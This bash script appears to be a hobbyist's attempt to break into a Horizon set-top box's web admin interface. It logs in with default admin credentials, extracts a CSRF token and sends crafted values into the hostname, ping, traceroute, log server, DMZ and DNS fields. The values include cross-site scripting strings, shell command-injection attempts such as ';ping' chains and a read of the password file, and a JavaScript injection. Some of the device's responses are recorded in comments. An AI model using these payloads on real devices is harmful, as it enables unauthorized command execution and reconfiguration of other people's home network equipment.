#!/bin/bash

echo "Try to get into the Horizon set-top box to be able to write programs for it"
echo "Preferably my robots should be able to navigate the menus"

echo "Time of the request: " $(date)

mediabox_url=http://100.10.100.1/cgi-bin
echo "The url used for the mediabox is $mediabox_url, yours might very well be different!"

echo "We store the cookie in cookie.txt, it has a sessionID"
cookie=cookie.txt

header1="User-Agent: Mozilla/5.0"
header2="Connection: keep-alive"
header3="Host: 100.10.100.1"

echo "Additional headers we use: $headers"

#verbosity="--silent"
echo "Verbosity is: $verbosity (set to --verbose if you want)"

#all_headers="$verbosity $headers --cookie $cookie"

new_login=true
request_token=true

if [ -n "$new_login" ]; then
	echo "We will now do a curl request, I might do something wrong here, so you might need also to login to your browser"
	curl --header "$header1" --header "$header2" --header "$header3" \
		--cookie-jar $cookie --data "page=login" --data "username=admin" \
		--data "password=admin" "$mediabox_url/sendResult.cgi?section=login"
	echo "Retrieved cookie"
	cat $cookie | grep sessionID
else
	echo "We skipped the login, make sure you do this only when your session (stored in the cookie) is still valid!"
fi

if [ -n "$request_token" ]; then
	echo "Obtain token from cookie"
	token=$(curl -s --cookie $cookie -X GET $mediabox_url/basic.cgi | grep token_csrf | cut -f4 -d' ' | cut -f2 -d'=' | tr -d "\"")
#	if [[ "$token" == "" ]]; then
#		echo "Token is empty, you probably screwed up the server"
#		exit
#	fi
	echo "Token obtained: $token"
	if [ ! -n "${token}" ]; then
		echo "Session expired, get a new nsrf token. And/or login on $mediabox_url yourself"
		exit;
	else
		echo "Use nsrf token ${token}"
	fi
#	url="$mediabox_url/system.cgi?section=backup&subsection=backup"
#
#	echo "Get nsrf token"
#	curl -v $all_headers --cookie $cookie -X GET "$url" > tokenfile.tmp
#
#	token=$(cat tokenfile.tmp | grep token_csrf | cut -f4 -d'=' | cut -f2 -d '"' | tr -d'')
#
fi


field="dnsserver"
echo "The field we are gonna use: $field"

# Just default payload
payload="10.0.0.10"

########################################################################################################################
# payload attempts to use the hostname for remote command execution
########################################################################################################################

if [[ "$field" == "hostname" ]]; then

# Reset to something like this
payload='hostname'

# This payload works with "hostname", nothing major, just go to the website and you will see an alert
payload='"/><script>alert("Hi")</script>'

# Just show the function upcApp.talk2device, although we know it already by just looking at the javascript code
payload='"/><script>alert(upcApp.talk2device)</script><"'

payload='";system("ping 10.0.0.10");"'
payload='#!/bin/bash; system("ping 10.0.0.10");'
payload=';ping 10.0.0.10;'

# it seems # or $ screws things up
payload='"ping 10.0.0.10;$result="yeah";'
payload="';cat \etc\password;ping 10.0.0.10;#'"

payload='";ping 10.0.0.10 -c1;'

fi

########################################################################################################################
# payload attempts to use ping X for remote command execution
# use sudo tpcdump -i wlan0 host 10.0.0.10 to see if it's getting through
########################################################################################################################

if [[ "$field" == "ping" ]]; then

# Just normal type of ping
payload='10.0.0.10'

# This payload results in just a normal ping to 10.0.0.1, everything else seems to be truncated
payload='10.0.0.1%20-c1;%20ping%2010.0.0.10'
# {"result":"success", "PingStatus":"PING 10.0.0.1 (10.0.0.1): 64 data bytes\n72 bytes from 10.0.0.1: seq=0 ttl=64 time=10.000 ms\n72 bytes from 10.0.0.1: seq=1 ttl=64 time=0.000 ms\n\n--- 10.0.0.1 ping statistics ---\n2 packets transmitted, 2 packets received, 0% packet loss\nround-trip min/avg/max = 0.000/5.000/10.000 ms\n", "finished":true}

# This payload has different results each time! Interesting. The 128 bytes and 2 packet information seems to get through, however the IP gets mangled differently at every evocation. This means that it is not just copying the first X bytes of a char array. It does something else.
payload='localhost'
payload=';%20ping%2010.0.0.10';
# {"result":"success", "PingStatus":"PING 98.50.52.49 (98.50.52.49): 128 data bytes\n\n--- 98.50.52.49 ping statistics ---\n2 packets transmitted, 0 packets received, 100% packet loss\n", "finished":true}
# {"result":"success", "PingStatus":"PING 55.57.53.56 (55.57.53.56): 128 data bytes\n\n--- 55.57.53.56 ping statistics ---\n2 packets transmitted, 0 packets received, 100% packet loss\n", "finished":true}

# Perhaps it is trying to find the delimiter "." and handles the thing in between as a "number". How to test that?

#payload='10.0.c.10'
# {"result":"success", "PingStatus":"PING 100.99.102.49 (100.99.102.49): 128 data bytes\n\n--- 100.99.102.49 ping statistics ---\n2 packets transmitted, 0 packets received, 100% packet loss\n", "finished":true}
# {"result":"success", "PingStatus":"PING 100.99.102.49 (100.99.102.49): 128 data bytes\n\n--- 100.99.102.49 ping statistics ---\n2 packets transmitted, 0 packets received, 100% packet loss\n", "finished":true}

# The following screws things up. The result is "fail" and when going to the interface I get a pop-up "Cannot start Ping process! [object Object]"
# 13:54:47.220238 IP 0.0.0.0.bootpc > 255.255.255.255.bootps: BOOTP/DHCP, Request from 3e:62:00:6f:b9:42 (oui Unknown), length 272
# Hey, a new MAC address, until now I had two 3c:62:00 addresses for the Samsung box, this one I did not see on an ARP-SCAN.
# payload='0.0.0.0'
# {"result":"fail"}

payload='10.0.0.10'

payload='10.0.0.266'

payload='response.end%28%22this%22%29'

#payload='"|ping 10.0.0.10 -c1"'

# Aha, with a new cookie this pings another server, with the same cookie the same server is pinged.
payload='|'

payload="2;app.get('/url',function(req,res){res.send('Corrupted');});"

fi

########################################################################################################################

echo "Command will be something like: $all_headers --data \"page=...\" --data \"field=$payload\""


if [[ "$field" == "hostname" ]]; then
	curl $all_headers --data "page=basic" --data "section=internet" --data "token_csrf=$token" --data "action=saveInternet" --data "hostname=$payload" $mediabox_url/sendResult.cgi
	echo
fi

if [[ "$field" == "domainname" ]]; then
	curl $all_headers --data "page=basic" --data "section=internet" --data "token_csrf=$token" --data "action=saveInternet" --data "domainname=$payload" $mediabox_url/sendResult.cgi
	echo
fi

if [[ "$field" == "dnsserver" ]]; then
	echo "Try to overwrite dnsserver"
# Accept: application/json, text/javascript
# Origin: http://100.10.100.1
# X-Requested-With
	curl -v --header "$header1" --header "$header2" --header "$header3" --cookie $cookie \
		--data "page=basic" --data "token_csrf=$token" \
		--data "ipAdd=100.10.100.1" --data "subnet=255.255.255.0" --data "enable=enabled" \
		--data "startLocalAdd=100.10.100.11" --data "dhcpPoolSize=100" --data "dhcpLeaseTime=86400" \
		--data "dns1=8.8.8.8" --data "dns2=8.8.4.4" --data "domainname_lan=net" --data "action=setLAN" $mediabox_url/sendResult.cgi?section=lan
	echo
fi

if [[ "$field" == "ping" ]]; then
	echo "Try to overwrite ip with ping command: pingHost=$payload"
	curl $all_headers --data "action=startPing" --data "page=status" --data "pingHost=$payload" --data "pingPackSize=128" --data "pingPackCount=2" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=ping
	sleep 3
	echo
	echo "Try to get the ping status now"
	curl $all_headers --data "action=getPingStatus" --data "page=status" --data "pingID=777" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=ping
	sleep 1
	echo
fi

if [[ "$field" == "pingcount" ]]; then
	curl $all_headers --data "action=startPing" --data "page=status" --data "pingHost=10.0.0.10" --data "pingPackSize=2400" --data "pingPackCount=$payload" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=ping
	sleep 3
	curl $all_headers --data "action=getPingStatus" --data "page=status" --data "pingID=777" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=ping
	echo
fi

if [[ "$field" == "trace" ]]; then
	echo "Try to overwrite ip with ping command: traceIp=$payload"
	curl $all_headers --data "action=startTrace" --data "page=status" --data "traceIp=$payload" --data "ttlFirst=1" --data "ttlMax=5" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=trace
	sleep 3
	curl $all_headers --data "action=getTraceStatus" --data "page=status" --data "traceID=777" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=diagnostic&subsection=trace
	echo
fi

# Following doesnot work
if [[ "$field" == "logserver" ]]; then
	echo "Try to overwrite ip to log to: logIP=$payload"
	curl $all_headers --data "page=system" --data "log_server_ip=$payload" --data "token_csrf=$token" $mediabox_url/sendResult.cgi?section=log&subsection=config
#	echo "Try to overwrite ip with ping command"
#	curl $all_headers --data "page=status" --data "section=diagnostics" --data "subsection=ping" --data "token_csrf=$token" --data "action=traceIP" --data "value=$payload" $mediabox_url/sendResult.cgi
	echo
fi

if [[ "$field" == "dmz" ]]; then
	echo "Try to overwrite DMZ host"
	curl $all_headers --data "page=advanced" --data "token_csrf=$token" --data "action=dmzAdd" --data "value=$payload" $mediabox_url/sendResult.cgi?section=dmz
	echo
fi

